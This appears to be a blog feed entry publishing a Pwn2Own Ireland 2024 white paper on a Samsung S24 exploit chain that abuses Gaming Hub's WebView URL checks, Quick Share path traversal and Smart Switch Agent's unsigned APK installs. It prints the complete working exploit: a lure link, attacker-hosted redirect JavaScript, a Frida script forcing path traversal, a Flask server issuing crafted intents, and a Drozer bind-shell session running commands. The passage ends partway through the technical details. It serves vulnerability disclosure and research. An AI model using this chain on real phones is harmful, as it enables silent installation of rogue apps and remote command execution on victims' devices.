<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://maliciouserection.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://maliciouserection.com/" rel="alternate" type="text/html" /><updated>2025-07-05T13:13:30+00:00</updated><id>https://maliciouserection.com/feed.xml</id><title type="html">Malicious Erection LLC</title><subtitle>Working hard to go up in the world!</subtitle><entry><title type="html">Pwn2Own Ireland 2024 - Samsung S24 Attack Chain White Paper</title><link href="https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html" rel="alternate" type="text/html" title="Pwn2Own Ireland 2024 - Samsung S24 Attack Chain White Paper" /><published>2025-05-13T00:00:00+00:00</published><updated>2025-05-13T00:00:00+00:00</updated><id>https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper</id><content type="html" xml:base="https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html"><![CDATA[<h2 id="description">Description</h2>

<p>The Samsung S24 contains several bugs which, when chained together, can result in rogue applications being installed on the device. At a high level, the chain consists of:</p>

<ul>
  <li>Tapping a malicious hyperlink on an attacker controlled website</li>
  <li>The application “Gaming Hub” (<code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome</code> version 7.1.01.7 or below) is launched and a WebView is loaded to the website <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com</code>
    <ul>
      <li>BUG 1 (CVE-2024-49419) – “Gaming Hub” does not perform a check against the URL before loading the URL in a WebView</li>
      <li>BUG 2 (CVE-2024-49418) – “Gaming Hub” does perform a check against the URL before enabling / disabling JavaScript in a WebView, but this check is insufficient
        <ul>
          <li>This check only enables / disables JavaScript in the WebView</li>
          <li>If this check fails, the URL will still load in the WebView</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>“Gaming Hub” can be forced to start arbitrary Android exported Activities
    <ul>
      <li>BUG 3 (CVE-2024-49420) – The “start Activity” code is executed when it receives data from the WebView in BUG 1
        <ul>
          <li>This code can be executed whether JavaScript is enabled / disabled</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>With the ability to launch arbitrary exported Activities, the application “Quick Share” (<code class="language-plaintext highlighter-rouge">com.samsung.android.app.sharelive</code> version 13.6.53.6) is launched and forced to download an arbitrary file from a nearby attacker controlled Samsung phone
    <ul>
      <li>In this chain, the attacker’s phone will send an attacker created .apk file</li>
    </ul>
  </li>
  <li>The attacker controlled Samsung phone sends a custom message to the target phone to save the sent file to an arbitrary location on the target phone
    <ul>
      <li>BUG 4 (CVE-2024-49421) – The application “Quick Share Agent” (<code class="language-plaintext highlighter-rouge">com.samsung.android.aware.service version</code> 3.5.19.33) contains a path traversal issue if the attacker’s phone sends a custom crafted message while transferring the target file</li>
    </ul>
  </li>
  <li>The application “Gaming Hub” contains permissions which give it the ability to launch applications while in the background; using this, the application “Smart Switch Agent” (<code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent</code> version 2.0.02.24) is launched</li>
  <li>When “Smart Switch Agent” is launched, it will try to either open a designated file or download a designated Content Provider to download a file
    <ul>
      <li>The Activity that gets launched is exported, but is protected by a permission</li>
      <li>However, “Gaming Hub” has this permission, which lets “Gaming Hub” launch the specific Activity</li>
    </ul>
  </li>
  <li>The Content Provider that is specified has access to the same area where the previously downloaded .apk is stored
    <ul>
      <li>So in this case, “Smart Switch Agent” is forced to download the previously downloaded .apk file</li>
    </ul>
  </li>
  <li>“Smart Switch Agent” then attempts to automatically install whatever file was downloaded
    <ul>
      <li>BUG 5 (CVE-2024-49413) – There are no sanity checks to determine where the downloaded file came from, nor if the application is supposed to be installed
        <ul>
          <li>“Smart Switch Agent” does not check if the downloaded .apk file was signed by Samsung before installation</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Finally, “Gaming Hub” launches the package that was installed by “Smart Switch Agent”</li>
</ul>

<h2 id="exploit-code">Exploit Code</h2>

<p>The exploit chain affects the following software. At the time of this document’s writing, the affected versions listed below are the latest publicly released versions:</p>

<ul>
  <li>Samsung Gaming Hub Android application
    <ul>
      <li>Package name: <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome</code></li>
      <li>Version: 7.1.01.7</li>
    </ul>
  </li>
  <li>Samsung Quick Share
    <ul>
      <li>Package name: <code class="language-plaintext highlighter-rouge">com.samsung.android.app.sharelive</code></li>
      <li>Version: 13.6.53.6</li>
    </ul>
  </li>
  <li>Samsung Quick Share Agent
    <ul>
      <li>Package name: <code class="language-plaintext highlighter-rouge">com.samsung.android.aware.service</code></li>
      <li>Version: 3.5.19.33</li>
    </ul>
  </li>
  <li>Samsung EasyMover Agent
    <ul>
      <li>Package name: <code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent</code></li>
      <li>Version: 2.0.02.24</li>
    </ul>
  </li>
</ul>

<p>The exploit chain requires:</p>

<ul>
  <li>Control of a domain name that starts with one of the following:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">us.mcsvc.samsung.com</code></li>
      <li><code class="language-plaintext highlighter-rouge">gmp.samsungapps.com</code></li>
      <li><code class="language-plaintext highlighter-rouge">smax.samsungapps.com</code></li>
    </ul>
  </li>
  <li>A web server that resides on the above controlled domain must have the following file:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">index.html</code></li>
    </ul>
  </li>
  <li>A rooted Samsung phone running the custom Frida script <code class="language-plaintext highlighter-rouge">yayscriptyay.js</code> within Bluetooth range of the target phone</li>
  <li>The rooted Samsung phone must also contain the following file and location:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">/storage/emulated/0/&lt;any folder name&gt;/yay.apk</code></li>
      <li><code class="language-plaintext highlighter-rouge">yay.apk</code> can be any .apk file of your choosing</li>
      <li>For this exploit chain, <code class="language-plaintext highlighter-rouge">yay.apk</code> is a custom build of Drozer</li>
    </ul>
  </li>
  <li>An attacker controlled web server (can be any IP address or domain) which has the following files:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">yay.py</code></li>
      <li><code class="language-plaintext highlighter-rouge">index.html</code> (different index.html)</li>
    </ul>
  </li>
</ul>

<p>For this exploit chain, Ken Gannon / 伊藤　剣 controls the domain <code class="language-plaintext highlighter-rouge">us.mcsvc.samsung.com.maliciouserection.com</code>. The contents of <code class="language-plaintext highlighter-rouge">index.html</code> at this webserver is below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yaytrampolineyay
&lt;script&gt;

// get hostname and port
var yayquerystringyay = window.location.search;
var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
var yayattackeryay = yayurlparamsyay.get('yayattackeryay');

// open sharelive to start awareservice
location.href="http://" + yayattackeryay + "/yaylaunchshareliveyay";

// redirect after 2 seconds
const yayshorttimeoutyay = setTimeout(yaystartyay, 2000);

// open sharelive and retrieve file
function yaystartyay() {
        location.href="http://" + yayattackeryay + "/yayshareliveyay";
}

// redirect after 15 seconds
const yaytimeoutyay = setTimeout(yayfinalyay, 15000);

// redirect to launch easymover agent
function yayfinalyay() {
        location.href="http://" + yayattackeryay + "/yayfinalyay";

        // redirect after another 15 seconds
        const yaytimeout2yay = setTimeout(yaylaunchyay, 15000);
}

// launch drozer
function yaylaunchyay() {
        location.href="http://" + yayattackeryay + "/yaylaunchyay";
}

&lt;/script&gt;
</code></pre></div></div>

<p>The contents of the Frida script <code class="language-plaintext highlighter-rouge">yayscriptyay.js</code> is below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console.log("script loaded");
Java.perform(function() {

    var yayclass1yay = Java.use('e2.t');

    yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) {

        if (a.has("IsPrivateShare")) {
            a.put("IsPrivateShare", true)
        }
        if (a.has("Path")) {
            a.put("Path","/../../../../../../GPUWatch_Dump/html/")
        }
        var ret_val = this.n(a,b,c);
        console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n")
        return ret_val;
    }
});
</code></pre></div></div>

<p>The attacker controlled web server, which can be on any IP address or host name, must launch the web server by running the Python script <code class="language-plaintext highlighter-rouge">yay.py</code>. The contents of <code class="language-plaintext highlighter-rouge">yay.py</code> is below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from flask import Flask, redirect, url_for, send_from_directory

app = Flask(__name__)

# Route for serving index.html
@app.route('/')
def index():
    return send_from_directory('', 'index.html')

# redirect to open com.sec.android.easyMover.Agent
@app.route('/yayfinalyay')
def yayfinalyay():
    return redirect("intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;", code=302)

# launch sharelive to stare aware service
@app.route('/yaylaunchshareliveyay')
def yaylaunchshareliveyay():
    return redirect("intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;", code=302)

# sharelive to download yay.apk to arbitrary location
@app.route('/yayshareliveyay')
def yayshareliveyay():
    yayqrcodeyay = "88AKqZwy2Hmr"
    return redirect("intent://qr.quickshare.samsungcloud.com/" + yayqrcodeyay + "#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;", code=302)

# launch drozer
@app.route('/yaylaunchyay')
def yaylaunchyay():
    return redirect("intent://#Intent;component=com.yaydevhackmodyay.drozer/com.mwr.dz.activities.MainActivity;end;", code=302)

# pichu dancing
@app.route('/pichu-dance.gif')
def pichuDance():
    return send_from_directory('', 'pichu-dance.gif')

if __name__ == '__main__':
    context = ('cert.pem', 'key.pem')
    app.run(debug=True, port=8000, host="0.0.0.0")
</code></pre></div></div>

<p>Finally, the contents of <code class="language-plaintext highlighter-rouge">index.html</code> that is on the same webserver being hosted by <code class="language-plaintext highlighter-rouge">yay.py</code> is below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt;
	&lt;button style="height:200px;width:200px" onclick="yayfunctionyay()"&gt;yaypocyay&lt;/button&gt;

	&lt;script type="text/javascript"&gt;

		function yayfunctionyay() {
			var yayhostyay = location.hostname; // gets host / domain, can also set this to a static value
            var yayportyay = location.port // must be a port number of some sort, or let the script get the port number

			// redirect to game home
	location.href="intent://com.samsung.android.game.gamehome/gmp?url=https://us.mcsvc.samsung.com.&lt;redacted&gt;.com?yayattackeryay=" + yayhostyay + ":" + yayportyay + "#Intent;scheme=gamelauncher;end";
					
	&lt;/script&gt;
	&lt;br&gt;
	&lt;img src="pichu-dance.gif"&gt;
&lt;/h1&gt;
</code></pre></div></div>

<p>After a successful exploitation, Drozer will be installed and launched on the device. The custom build of Drozer starts a bind shell when the application is opened. Because of this, it is possible for an attacker to connect to the Drozer bind shell and execute arbitrary commands:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@1f2e8d5823c5:/# drozer console connect --server host.docker.internal
Selecting 5dee1795a19a8793 (samsung SM-S921B 14)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotecyayandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v3.1.0)
dz&gt; shell
Attempting to run shell module
:/data/data/com.yaydevhackmodyay.drozer $ id
uid=10356(u0_a356) gid=10356(u0_a356) groups=10356(u0_a356),3003(inet),9997(everybody),20356(u0_a356_cache),50356(all_a356) context=u:r:untrusted_app_32:s0:c100,c257,c512,c768
</code></pre></div></div>

<h2 id="technical-details">Technical Details</h2>

<h3 id="bugs-1-and-2--use-a-browsable-intent-to-launch-gaming-hub-and-open-a-webview-to-a-custom-url-with-javascript-enabled">Bugs 1 and 2 – Use a Browsable Intent to launch Gaming Hub and open a WebView to a custom URL with JavaScript enabled</h3>

<h4 id="exploit-payload">Exploit Payload</h4>

<p>Below is the payload used in this chain link. An attacker should host this HTML code and trick a user into tapping the hyperlink on their phone:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
    &lt;body&gt;
        &lt;h1&gt;
        &lt;a href=" intent://com.samsung.android.game.gamehome/gmp?url=https://us.mcsvc.samsung.com.&lt;redacted&gt;.com?yayattackeryay=&lt;attackerServer&gt;#Intent;scheme=gamelauncher;end"&gt;yaypocyay&lt;/a&gt;
        &lt;/h1&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<h4 id="exploit-details">Exploit Details</h4>

<p>The application “Gaming Hub” (<code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome</code> version 7.1.01.7) contains an exported Activity (<code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.app.MainActivity</code>) which can be launched via Browsable Intent. Depending on the Data URI attached to the Intent, different actions can be executed when the Intent is processed.</p>

<p><code class="language-plaintext highlighter-rouge">MainActivity</code> retrieves the incoming Browsable Intent via the following code, which then passes the Intent onto the class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.GmpDeepLinkUtil</code> method <code class="language-plaintext highlighter-rouge">c(Context, Intent)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class MainActivity extends a {
...
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            Intent intent = getIntent();
            m0(intent);
        }
    ...
    public final void m0(Intent intent) {
        Intent deepLinkIntent = GmpDeepLinkUtil.a.c(this, intent);
        if (deepLinkIntent != null) {
            startActivity(deepLinkIntent);
            finish();
        ...
    }
</code></pre></div></div>

<p>The class <code class="language-plaintext highlighter-rouge">GmpDeepLinkUtil</code> will extract the Data URI from the Intent and create a new Intent object based on the first path segment of the URI. If the first path segment is set to “gmp”, then the following actions are taken:</p>

<ul>
  <li>Create a new Intent object and set the component value of that Intent object to <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code></li>
  <li>In the URI object, retrieve the GET parameter “url” and add it as an Intent String Extra called “url” to the newly created Intent object</li>
  <li>Adds the value “WebView” as an Intent String extra called “target” to the newly created Intent object</li>
  <li>Return the newly created Intent object</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpDeepLinkUtil {
...
    public final Intent c(Context context, Intent intent) {
        
        Uri yayuriyay = intent.getData();
        if (yayuriyay == null) {
            return null;
        }
        return d(context, yayuriyay);
    }

    public final Intent d(Context context, Uri yayuriyay) {
        try {
            ...
            String yayfirstpathyay = i(yayuriyay); // retrieves first path value
            ...
            Intent yayintentyay = a(); // create new Intent object
            if (yayfirstpathyay != null) {
                switch (yayfirstpathyay.hashCode()) {
                    ...
                    case 102474: // first path equals `gmp` 
                        if (!yayfirstpathyay.equals("gmp")) {
                            break;
                        } else {
                            String yayqueryyay = yayuriyay.getQueryParameter("url");
                            if (yayqueryyay == null) {
                                return null;
                            }
                            yayintentyay.putExtra("url", yayqueryyay);
                            yayintentyay.putExtra("target", Path.WebView.name());
                            yayintentyay.setClass(context, GmpWebActivity.class);
                            return yayintentyay;
                        }
                    ...
        }
    }
</code></pre></div></div>

<p>Once the new Intent object is returned, it is passed back to class <code class="language-plaintext highlighter-rouge">MainActivity</code> method <code class="language-plaintext highlighter-rouge">k0(Intent)</code>. From there, <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> is executed against the Intent object, which will launch the component <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class MainActivity extends a {
...
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            Intent intent = getIntent();
            k0(intent);
        }
    ...
    public final void k0(Intent intent) {
        Intent deepLinkIntent = GmpDeepLinkUtil.a.c(this, intent);
        if (deepLinkIntent != null) {
            startActivity(deepLinkIntent);
            finish();
        ...
    }
</code></pre></div></div>

<p>In the class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">onCreate(Bundle)</code>, the incoming Intent object is retrieved and the Intent String extra “target” is analyzed. Since the value is set to “WebView”, the application will perform two actions.</p>

<p>First, the Intent object is passed to class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.GmpDeepLinkUtil</code> method <code class="language-plaintext highlighter-rouge">j(Intent)</code> to retrieve and return the Intent String extra “url”.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public void onCreate(Bundle bundle) {
        GmpDeepLinkUtil.Path path;
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            ...
            Intent intent = getIntent();
            path = gmpDeepLinkUtil.h(intent); // retrieves the String extra "target"
        } else {
            path = null;
        }
        int i = path == null ? -1 : b.a[path.ordinal()]; // checks value of "target"
        if (i == 1) {
            ...
        } else if (i == 3) {
            GmpDeepLinkUtil gmpDeepLinkUtil = GmpDeepLinkUtil.a; // new instance
            Intent yayintentyay = getIntent();
            E0(this, gmpDeepLinkUtil.j(yayintentyay), null, false, true, 2, null);
    ...
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpDeepLinkUtil {
...
    public final String j(Intent intent) {
        String stringExtra = intent.getStringExtra("url");
        return stringExtra == null ? "" : stringExtra;
    }
</code></pre></div></div>

<p>Next, the returned “url” String extra is passed to class <code class="language-plaintext highlighter-rouge">GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">E0(GmpWebActivity, String, String, Boolean, Boolean, int, Object)</code>, which passes the “url” to method <code class="language-plaintext highlighter-rouge">D0(String, String, boolean, boolean)</code>, which then passes the URL to method <code class="language-plaintext highlighter-rouge">v0(String)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public void onCreate(Bundle bundle) {
        GmpDeepLinkUtil.Path path;
        super.onCreate(bundle);
        ...
        if (bundle == null) {
            ...
            Intent intent = getIntent();
            path = gmpDeepLinkUtil.h(intent); // retrieves the String extra "target"
        } else {
            path = null;
        }
        int i = path == null ? -1 : b.a[path.ordinal()]; // checks value of "target"
        if (i == 1) {
            ...
        } else if (i == 3) {
            GmpDeepLinkUtil gmpDeepLinkUtil = GmpDeepLinkUtil.a; // new instance
            Intent yayintentyay = getIntent();
            E0(this, gmpDeepLinkUtil.j(yayintentyay), null, false, true, 2, null);
    ...

    public static void E0(GmpWebActivity gmpWebActivity, String yayurlyay, String str2, boolean z, boolean z2, int i, Object obj) {
        ...
        gmpWebActivity.D0(yayurlyay, str2, z, z2);
    }
    ...

    public final void D0(String yayurlyay, String str2, boolean z, boolean z2) {
        ...
        final String yayparsedurlyay = q0(yayurlyay); // do stuff if url scheme is either `gamelauncher` or `gmp`
        v0(yayparsedurlyay);
</code></pre></div></div>

<p>In the method <code class="language-plaintext highlighter-rouge">v0(String)</code>, a WebView is set to object d and configured. One thing to note is that the “url” value is passed to class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebViewModel</code> method <code class="language-plaintext highlighter-rouge">F(String)</code> to check if the “url” value is a valid URL.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public final void v0(String yayurlyay) {
        WebView webView = r0().d;
        WebSettings settings = webView.getSettings();
        settings.setDomStorageEnabled(true);
        ...
        if (s0().F(yayurlyay)) {
            p0(webView);
        }
    }
</code></pre></div></div>

<p>The method F(String) passes the “url” value to multiple different areas of the application. One of these checks determines if the “url” value starts with one of the following:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://d2da9i65hvaere.cloudfront.net/</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://gmp.samsungapps.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://img.samsungapps.com/</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://d1559sbyyf3apa.cloudfront.net/</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://smax.samsungapps.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://d2da9i65hvaere.cloudfront.net/</code></li>
</ul>

<h4 id="bug-1--insufficient-check-against-the-url">BUG 1 – Insufficient check against the URL</h4>

<p>Some of the URLs above did not end with the “/” character. Because of this, the host value of the incoming “url” simply needs to start with one of the vulnerable values.</p>

<p>For example, in this exploit chain, our “url” value is set to <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>. Since the URL does start with <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com</code>, this check will pass successfully.</p>

<p>After the check in the <code class="language-plaintext highlighter-rouge">F(String)</code> method is checked and it passes, the “url” value is passed to method <code class="language-plaintext highlighter-rouge">p0(WebView)</code>. This method will take the WebView object <code class="language-plaintext highlighter-rouge">d</code> and enable JavaScript.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    
    public final void v0(String yayurlyay) {
        WebView webView = r0().d;
        WebSettings settings = webView.getSettings();
        settings.setDomStorageEnabled(true);
        ...
        if (s0().F(yayurlyay)) {
            p0(webView);
        }
    }
    ...
    public final void p0(WebView webView) {
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        ...
</code></pre></div></div>

<p>Going back to method <code class="language-plaintext highlighter-rouge">D0(String, String, boolean, boolean)</code>, the “url” value is passed to the method <code class="language-plaintext highlighter-rouge">w0(String)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    public final void D0(String yayurlyay, String str2, boolean z, boolean z2) {
        ...
        final String yayparsedurlyay = q0(yayurlyay); // do stuff if url scheme is either `gamelauncher` or `gmp`
        v0(yayparsedurlyay);
        if (z2) {
                s0().G(false, new a() { 
                        ...
                        public final void a() {
                            GmpWebActivity.this.w0(yayparsedurlyay);
                        }
</code></pre></div></div>

<p>In method <code class="language-plaintext highlighter-rouge">w0(String)</code>, the WebView object <code class="language-plaintext highlighter-rouge">d</code> is forced to load the URL value that was stored in our “url” value.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    public final void w0(String yayurlyay) {
        ...
        r0().d.loadUrl(yayurlyay);
    }
</code></pre></div></div>

<h4 id="bug-2--webview-loads-any-url">BUG 2 – WebView Loads Any URL</h4>

<p>The WebView does not check the incoming URL before loading the URL. So the “url” value used in our exploit chain (<code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>) will be loaded into the WebView.</p>

<p>Screenshot of Gaming Hub loading the URL <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>:</p>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-1.png" />
</div>

<h3 id="bug-3--force-gaming-hub-to-start-arbitrary-exported-activities">Bug 3 – Force Gaming Hub to start arbitrary exported Activities</h3>

<h4 id="exploit-payload-1">Exploit Payload</h4>

<p>Two payloads are used for this bug. The first payload is the HTML content that is hosted at the URL <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code>. Due to bugs 1 and 2, the Gaming Hub WebView will load and execute the below HTML code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yaytrampolineyay
&lt;script&gt;

// get hostname and port
var yayquerystringyay = window.location.search;
var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
var yayattackeryay = yayurlparamsyay.get('yayattackeryay');

// open sharelive to start awareservice
location.href="http://" + yayattackeryay + "/yaylaunchshareliveyay";

// redirect after 2 seconds
const yayshorttimeoutyay = setTimeout(yaystartyay, 2000);

// open sharelive and retrieve file
function yaystartyay() {
        location.href="http://" + yayattackeryay + "/yayshareliveyay";
}

// redirect after 15 seconds
const yaytimeoutyay = setTimeout(yayfinalyay, 15000);

// redirect to launch easymover agent
function yayfinalyay() {
        location.href="http://" + yayattackeryay + "/yayfinalyay";

        // redirect after another 15 seconds
        const yaytimeout2yay = setTimeout(yaylaunchyay, 15000);
}

// launch drozer
function yaylaunchyay() {
        location.href="http://" + yayattackeryay + "/yaylaunchyay";
}

&lt;/script&gt;
</code></pre></div></div>

<p>The second payload is a Python script that is hosted at an attacker controlled server. There is no IP address or domain requirements for this web server, as long as the server can be reached via HTTP/S.</p>

<p>By running the below Python script, the attacker will run a Flask based web server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from flask import Flask, redirect, url_for, send_from_directory

app = Flask(__name__)

# Route for serving index.html
@app.route('/')
def index():
    return send_from_directory('', 'index.html')

# redirect to open com.sec.android.easyMover.Agent
@app.route('/yayfinalyay')
def yayfinalyay():
    return redirect("intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;", code=302)

# launch sharelive to stare aware service
@app.route('/yaylaunchshareliveyay')
def yaylaunchshareliveyay():
    return redirect("intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;", code=302)

# sharelive to download yay.apk to arbitrary location
@app.route('/yayshareliveyay')
def yayshareliveyay():
    yayqrcodeyay = "88AKqZwy2Hmr"
    return redirect("intent://qr.quickshare.samsungcloud.com/" + yayqrcodeyay + "#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;", code=302)

# launch drozer
@app.route('/yaylaunchyay')
def yaylaunchyay():
    return redirect("intent://#Intent;component=com.yaydevhackmodyay.drozer/com.mwr.dz.activities.MainActivity;end;", code=302)

# pichu dancing
@app.route('/pichu-dance.gif')
def pichuDance():
    return send_from_directory('', 'pichu-dance.gif')

if __name__ == '__main__':
    context = ('cert.pem', 'key.pem')
    app.run(debug=True, port=8000, host="0.0.0.0")
</code></pre></div></div>

<h4 id="exploit-details-1">Exploit Details</h4>

<p>Continuing to exploit the Gaming Hub application, the loaded WebView contains code that will execute different actions based on the type of data that is received from the loaded web server.</p>

<p>When the WebView receives a 302 Redirect code from the web server, the class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.o</code> method <code class="language-plaintext highlighter-rouge">shouldOverrideUrlLoading(WebView, WebResourceRequest)</code> is executed. From there, the redirection URL is analyzed.</p>

<p>If the redirection URL has a scheme value of <code class="language-plaintext highlighter-rouge">intent://</code>, then the URL is passed to class <code class="language-plaintext highlighter-rouge">com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">f(Uri, int)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class o extends WebViewClient {
    public final p a; // interface linked with GmpWebActivity
...
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        boolean q;
        ...
        String yayschemeyay = request.getUrl().getScheme();
        Uri yayurlyay = request.getUrl();
        ...
        q = o.q("intent", yayschemeyay, true); // checks if first 2 objects match
        if (q) {
            this.a.f(url, a(yayurlyay)); // checks if the url authority value is either `instantplays` or `cloudgame`
            return true;
        }
</code></pre></div></div>

<p>Class <code class="language-plaintext highlighter-rouge">GmpWebActivity</code> method <code class="language-plaintext highlighter-rouge">f(Uri, int)</code> takes the incoming URL and passes it to Android’s internal Intent parser. The Intent parser is commonly used to craft Intent objects based on the incoming URI value. After the Intent object is created, <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> is executed against the Intent object.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class GmpWebActivity extends s implements n, p {
...
    public void f(Uri yayurlyay, int i) {
        Intent yayintentyay = Intent.parseUri(yayurlyay.toString(), 0);
        yayintentyay.addFlags(i);
        ...
        a.b(a, this, yayintentyay, false, 2, null);
    }
... 
